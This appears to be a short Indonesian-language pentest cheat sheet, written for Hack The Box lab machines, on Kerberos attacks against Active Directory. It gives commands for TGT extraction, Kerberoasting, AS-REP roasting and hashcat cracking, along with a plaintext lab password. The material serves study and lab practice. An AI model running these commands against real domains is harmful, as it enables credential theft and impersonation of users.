sistem autentikasi di windows AD tanpa harus mengirimkan password ke jaringan, tapi menggunakan sistem tiket.

# Download Kerberos configuration
```shell
nxc smb logging.htb --generate-krb5-file ./krb5.conf  
  
# Export configuration  
export KRB5_CONFIG=./krb5.conf
```
# TGT
Kalau kamu punya TGT seseorang → kamu bisa **impersonate** mereka tanpa tahu passwordnya!
selalu gunakan impacket-getTGT untuk extract TGT nya.
```shell
impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95 
```
![](Attachments/Pasted%20image%2020260617205211.png)

export TGT
```shell
export KRB5CCNAME=MS01\$.ccache 
```
## klist
get TGT and validation with klist 
![](Attachments/Pasted%20image%2020260616204625.png)
# Kerberoasting Attack
```shell
impacket-GetUserSPNs pirate.htb/'pentest':'p3nt3st2025!&' -dc-ip 10.129.244.95 -request -outputfile kerberoast_hashes.txt
```
![](Attachments/Pasted%20image%2020260616133752.png)

# AS-REP Roasting
```shell
# menggunakan list user yang didapat dari rid brute pada enum smb sebelumnya, tidak perlu password
impacket-GetNPUsers logging.htb/ -usersfile listuser.txt -no-pass -dc-ip 10.129.245.130 

#Jika dapat langsung crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

```